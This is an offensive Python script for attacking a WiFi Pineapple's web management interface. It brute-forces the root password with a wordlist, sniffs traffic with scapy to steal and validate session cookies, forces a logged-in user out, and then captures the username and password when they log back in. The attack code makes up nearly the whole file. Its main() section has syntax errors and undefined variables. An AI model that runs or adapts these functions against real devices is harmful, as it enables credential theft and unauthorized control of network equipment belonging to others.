#!/usr/bin/env python3
"""
Functions with express design to attack a wifi pineapple
Can run independently as a script and can alter behavior with either the
 config file or cli arguments
"""

def __basic_pkt_check__(pkt, pine_ip="172.16.42.1", pine_port=1471):
    """
    Basic checks that all sniffed packets contain what we're interested in for web session hijacking
    Requires scappy packet object
    optional str(ip) of pineapple
    optional int(port) of pineapple interface
    returns True if basic checks pass, else False

    Basic checks include:
    -Packet has IP section
    -Packet's destination or source is the pineapple ip
    -Packet has TCP headers
    -Packet came from or is going to the web interface port
    -Packet has data
    -Packet's data is a POST request
    -Packet's data is not an hTTP server response
    """

    if "IP" not in pkt:
        return False
    if not pkt["IP"].dst == pine_ip and not pkt["IP"].src == pine_ip:
        return False
    if not "TCP" in pkt:
        return False
    if not pkt.dport == pine_port and not pkt.sport == pine_port:
        return False
    if not "Raw" in pkt:
        return False
    if not pkt.load.startswith(b'POST ') and not pkt.load.startswith(b'HTTP/1.1 200 OK'):
        return False
    return True

def __pineapple_api_handle__(cookie, head, json, pine_ip="172.16.42.1", pine_port=1471):
    """
    Handles requests to and from the pineapple
    They suck to do by default, this helps
    Requires dict(cookies) to include in request
    Requires dict(headers) to include in request
    Requires dict(json) data to include in request
    optional str(ip) of pineapple
    optional int(port) of pineapple web interface
    returns dict(json) response from the pineapple
    """

    from json import loads
    from requests import post

    response = post(
        "http://{}:{}/api/".format(pine_ip, pine_port),
        headers=head,
        cookies=cookie,
        json=json)

    # This is how we need to get the json back.  The pineapple's api return is kinda borked
    response.json = loads(response.text.split("\n")[1])
    return response

def brute_web(wordlist, pine_ip="172.16.42.1", pine_port=1471, user="root"):
    """
    Brute force the management password
    requires str(path) to a valid wordlist
    optional str(ip) of pineapple
    optional int(port) of web interface
    optional str(username) of account to attack
    returns str(password) of 
    """

    with open(wordlist, "r", encoding="iso-8859-15") as fin:
        for attempt in fin:
            attempt = attempt.strip()
            response = __pineapple_api_handle__(
                    {}, {},
                {"action": "login", "system": "authentication",
                    "username": user, "password": attempt},
                pine_ip=pine_ip, pine_port=pine_port)

            if response.json.get("logged_in", False):
                return attempt

def session_grab(iface, pine_ip="172.16.42.1", pine_port=1471):
    """
    Sniff out a valid logged in session from a pineapple
    Requires str(interface) of interface to execute attack on
    optional str(ip) of pineapple to target
    optional int(port) of pineapple's web interface portal
    returns a dict{header : value} needed to authenticate with the sniffed session
    """

    def session_break(pkt):
        """
        Sniffer filter to know when to stop sniffing
        returns True when a valid session is found
        else False

        To validate, a scapy packet is provided and examined for the following
        -If the packet is to the pineapple
        -if the packet contains http data
        -if the session within the data is valid
        To test of the session is valid, once the php session and xsrf are gathered,
         a request is sent to check if the session is authentic using the pineapple's
         api call "checkAuth"
        """

        if not __basic_pkt_check__(pkt, pine_ip=pine_ip, pine_port=pine_port):
            return False

        sniffed_cookie = [header.decode() for header in pkt["Raw"].load.split(b'\r\n')
                          if header.startswith(b"Cookie: ")]
        if not sniffed_cookie:
            return False

        sniffed_cookie = sniffed_cookie[0][8:]

        # Now that we have a session, we need to ensure it's a valid one
        #Until requests has a clean way to hand off strings as cookies, this is my method
        #to convert http cookies into a dictionary that requests can understand
        cookie = {key.strip() : value.strip() for key, value in
                  [pair.split("=") for pair in
                   [line for line in sniffed_cookie.split(";")]]}

        head = {"X-XSRF-TOKEN" : cookie["XSRF-TOKEN"]}

        response = __pineapple_api_handle__(
            cookie, head,
            {"action": "checkAuth", "system": "authentication"},
            pine_ip=pine_ip, pine_port=pine_port)

        if response.json.get('authenticated', False):
            session_break.creds = {
                'XSRF-TOKEN' : cookie['XSRF-TOKEN'],
                'PHPSESSID': cookie['PHPSESSID']}

            # https://www.youtube.com/watch?v=-15VC4Yxzys
            return True

        return False
    # end session_break

    from scapy.all import sniff

    # This is how we keep the credentials outside the sniff function
    session_break.creds = None
    sniff(
        iface=iface, store=False, filter='host {} and port {}'.format(pine_ip, pine_port),
        stop_filter=session_break)

    return session_break.creds

def session_deauth(iface, pine_ip="172.16.42.1", pine_port=1471):
    """
    Deauthenticate a valid session
    Requires str(interface) of interface to execute attack on
    optional str(ip) of pineapple to target
    optional int(port) of pineapple's web interface portal
    Returns True if the session is now deauthed, else False
    """

    cookie = session_grab(iface=iface, pine_ip=pine_ip, pine_port=pine_port)
    cookie['scanDuration'] = '0'
    cookie['liveScan'] = 'true'
    head = {'X-XSRF-TOKEN' : cookie['XSRF-TOKEN']}
    response = __pineapple_api_handle__(
        cookie, head,
        {"system":"authentication", "action":"logout"},
        pine_ip=pine_ip, pine_port=pine_port)
    return not response.json.get('logged_in', True)

def password_sniff(iface, pine_ip="172.16.42.1", pine_port=1471, passive=False):
    """
    Sniffs out a login to the managment console
    Requires str(interface) of interface to execute attack on
    optional str(ip) of pineapple to target
    optional int(port) of pineapple's web interface portal
    optional bool() to spesify if session_deauth should be run before sniffing the password
    """

    def password_break(pkt):
        """
        Sniff filter to know when to stop sniffing
        """

        from json import loads

        if not __basic_pkt_check__(pkt, pine_ip=pine_ip, pine_port=pine_port):
            return False

        # If from pineapple, listen for logged in status
        if pkt["IP"].src == pine_ip:
            # Because a lot of information coming back might not have a json, we need to check
            #for that
            caught_json = [_ for _ in pkt.load.split(b"\r\n") if _.startswith(b')]}')]
            if caught_json:
                if caught_json[0].split(b'\n')[1].startswith(b'{"logged'):
                    caught_json = loads(caught_json[0].decode().split("\n")[1])
                    if isinstance(caught_json, dict):
                        if caught_json.get("logged_in", False) and password_break.creds:
                            return True

        # If to pineapple, grab creds
        else:
            caught_json = loads(pkt.load.decode().split("\r\n")[-1])
            if caught_json.get("action", "error") == "login":
                password_break.creds = {}
                for of_interest in ['username', 'password']:
                    password_break.creds[of_interest] = caught_json[of_interest]
            else:
                password_break.creds = None

        return False
    # end password_break

    from scapy.all import sniff

    if not passive:
        session_deauth(iface, pine_ip, pine_port)

    password_break.creds = None
    sniff(
        iface=iface, store=False, filter='host {} and port {}'.format(pine_ip, pine_port),
        stop_filter=password_break)

    return password_break.creds

def main():
    """
    Default functionality if ran as a script
    """

    def attack_check():
        from importlib import import_module
        self = import_module(__name__)
        return hasattr(self, options.get("Attack", "method"))

    from sys import argv
    from config import arg_config

    options = arg_config(argv)

    if not attack_check():
        print("'{}' not a valid attack method".format(options.get("Attack", "method")))
        exit(-1)

    # Handling supported attacks
    print("Initiating attack")

    method = options.get("Attack", "method")
    print("Target: {}".format(options.get("Target", "ip4")))
    print("Method: {}".format(method))

    if method == "brute_web":
        print("Web Port: {}".format(options.get("Target", "web")))

        print("Attempting to brute force the web portal at root@{}:{}".format(
            option.get("Target", "ipv4"),
            option.get("Target", "web")
        try:
            passwd = brute_web(options.get("Attack", "wordlist"),
                pine_ip=options.get("Target", "ipv4"),
                pine_port=options.get("Target", "web"))
        except KeyboardInterrupt:
            print("Quitting...")
            exit(0)

        print("Password cracked: {}".format(passwd))

    elif method == "session_grab":
        print("Attempting to grab valid session from {}".format(option.get("Target", "ipv4"))

        try:
            creds = session_grab(options.get("Misc", "iface"),
                    pine_ip=options.get("Target", "ipv4"),
                    pine_port=options.get("Target", "web"))

        except KeyboardInterrupt:
            print("Quitting...")
            exit(0)

        print("Caught valid session")
        for header in creds:
            print("{:10} : {}".format(header, creds[header]))

    elif method == "session_deauth":
        print("Deauthing valid session from {}".format(option.get("Target", "ipv4")), end="")

        try:
            if option.get("Extra", "loop"):
                print(" indeffinetly")
            else:
                print()

            while True:
                session_deauth(options.get("Misc", "iface"),
                    pine_ip=options.get("Target", "ipv4"),
                    pine_port=options.get("Target", "web"))
                if option.get("Extra", "loop", fallback=False):
                    break
            print("Valid session deauthed")
            
        except KeyboardInterrupt:
            print("Quitting...")
            exit(0)

    elif method == "password_sniff":
        print("Sniffing password login")

        try:
            print("Finding valid session")
            session_deauth(options.get("Misc", "iface"),
                pine_ip=options.get("Target", "ipv4"),
                pine_port=options.get("Target", "web"))

            print("Valid session deauthed, sniffing for password login")
            password_sniff(options.get("Misc", "iface"),
                pine_ip=options.get("Target", "ipv4"),
                pine_port=options.get("Target", "web"))
            

        except KeyboardInterrupt:
            print("Quitting...")
            exit(0)

    else:
        print("Unsupported attack method: {}".format(method))

    print("Attack complete, quitting")

if __name__ == "__main__":
    main()
